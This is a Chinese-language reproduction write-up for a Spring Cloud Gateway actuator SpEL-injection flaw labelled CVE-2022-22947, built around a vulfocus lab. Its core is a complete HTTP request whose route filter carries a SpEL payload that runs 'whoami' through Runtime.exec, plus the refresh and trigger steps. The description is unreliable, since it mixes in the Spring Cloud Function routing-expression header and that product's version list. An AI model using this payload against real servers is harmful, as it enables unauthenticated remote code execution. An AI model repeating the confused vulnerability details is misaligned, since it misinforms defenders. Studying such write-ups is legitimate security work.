0x00 漏洞描述


Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。


Spring Cloud Function SpEL 表达式注入漏洞，发生在 Spring Cloud Gateway 应用程序的 Actuator 端点，远程攻击者在无需认证的情况下，构造特定的数据包，在header中添加"spring.cloud.function.routing-expression"参数并携带 SpEL 表达式，成功利用此漏洞可实现任意代码执行。


漏洞编号：CVE-2022-22947


0x01 影响版本


Spring Cloud Function

3.1.0

3.0.0 至 3.0.6

3.0.0 之前的版本


0x02 漏洞搭建


http://vulfocus.io

vulfocus/spring-cloud-function-rce:latest:latest


0x03 漏洞复现


抓包，根据提示，访问 /Actuator 端点

查看 /actuator/gateway/routes/

返回的路由信息表明，当访问 index 时，路由到 http://example.com:80


这时要构造包含恶意的路由，使用POST请求，请求头要有Content-Type: application/json，请求体中的内容是创建名为 test 的路由，让他去执行我们的 whoami 命令。

POST /actuator/gateway/routes/test HTTP/1.1Host: 127.0.0.1:50950User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMTIf-None-Match: "3147526947"Cache-Control: max-age=0Content-Type: application/jsonContent-Length: 432 {    "id": "test",    "filters": [        {            "name": "AddResponseHeader",            "args": {                "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}",                "name": "cmd"            }        }    ],    "uri": "http://example.com:80",    "order": 0}


成功创建路由。


刷新路由

POST /actuator/refresh


访问创建的路由

GET /actuator/gateway/routes/test/

命令执行成功。


删除创建的路由，使用 DELETE 请求

DELETE /actuator/gateway/routes/test/


0x04 防护方案


如果不需要Actuator功能，可以通过management.endpoint.gateway.enable：false配置将其禁用；


Spring Cloud Function  3.1.x 用户应升级到 3.1.1+；3.0.x用户应升级到3.0.7+。
